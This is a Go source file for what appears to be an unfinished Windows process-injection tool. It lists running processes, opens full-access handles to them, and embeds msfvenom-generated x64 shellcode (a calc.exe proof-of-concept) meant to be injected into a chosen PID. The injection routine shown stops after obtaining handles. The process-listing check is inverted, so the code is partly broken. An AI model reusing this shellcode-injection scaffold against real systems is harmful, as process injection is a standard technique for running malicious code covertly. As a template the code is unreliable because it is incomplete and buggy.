package main

import (
	"fmt"
	"os"
	"strconv"
)

func main() {

	fmt.Println("[i] Best to execute with elevated privileges!")
	fmt.Println("[i] Usage: appName.exe [<PID>]")

	if len(os.Args) == 1 { // no arg given - list processes, and try create handles for each one
		listAllProcesses()
	} else if len(os.Args) == 2 { // pid given to inject into
		pid_proc, _ := strconv.ParseUint(os.Args[1], 10, 32)
		processPid := uint32(pid_proc)

		// Generated with: msfvenom -p windows/x64/exec CMD="calc.exe" -f go
		buf := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00,
			0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
			0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20,
			0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
			0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1,
			0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b,
			0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00,
			0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b,
			0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
			0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9,
			0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38,
			0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75,
			0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
			0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
			0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41,
			0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff,
			0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff,
			0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
			0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95,
			0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a,
			0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00,
			0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65,
			0x78, 0x65, 0x00}

		injectIntoProcessAndExecute(processPid, buf)
	}

}

func listAllProcesses() {
	procArrSize := 1024
	procIdArr := make([]uint32, procArrSize)
	var lpcbNeeded uint32 = 0

	if EnumProcesses(procIdArr, 1024, &lpcbNeeded) {
		fmt.Println("[!] Failed to read the processes. Leaving...")
		return
	}

	fmt.Println("[+] Listing processes ids...")
	for _, p := range procIdArr[:lpcbNeeded/4] {
		fmt.Println(p)
	}

	fmt.Println("[+] Looking for specific process...")

	var procAccess int32 = 0x1F0FFF
	for _, p := range procIdArr[:lpcbNeeded/4] {

		fmt.Println("[+] Opening process handle...")
		var procHandle uintptr = OpenProcess(procAccess, false, p)
		if procHandle == 0 {
			fmt.Printf("[!] Could not open handle to process with PID: %d\n", p)
			continue
		}
		fmt.Printf("[+] Obtained handle: %d for PID: %d\n", procHandle, p)

		fileNameMaxSize := 256
		fileNameBuff := make([]byte, fileNameMaxSize)

		var resolvedProcessFileName string
		if GetProcessImageFileNameA(procHandle, fileNameBuff, 256) {
			resolvedProcessFileName = string(fileNameBuff[:])
			fmt.Printf("[+] Found process fileName: %s\n", resolvedProcessFileName)
		}

		fmt.Printf("[+] Closing handle: %d\n", procHandle)
		if !CloseHandle(procHandle) {
			fmt.Printf("[+] Could not close process handle: %d\n", procHandle)
		} else {
			fmt.Printf("[+] Successfully closed process handle.\n")
		}
	}
}

func injectIntoProcessAndExecute(pid uint32, buffer []byte) {

	procAccess := uint32(0x001F0FFF)
	var hRemoteProcess uintptr = OpenProcess(procAccess, false, pid)
	if hRemoteProcess == 0 {
		fmt.Printf("[!] Could not open handle to process with PID: %d\n", pid)
	}
	fmt.Printf("[+] Obtained handle: %d for PID: %d\n", hRemoteProcess, pid)

	var hLocalProcess uintptr = GetCurrentProcess()
	if hLocalProcess == 0 {
		fmt.Printf("[!] Could not open handle to local process.\n")
	}
	fmt.Printf("[+] Obtained handle: %d for PID: %d\n", hLocalProcess, pid)

}
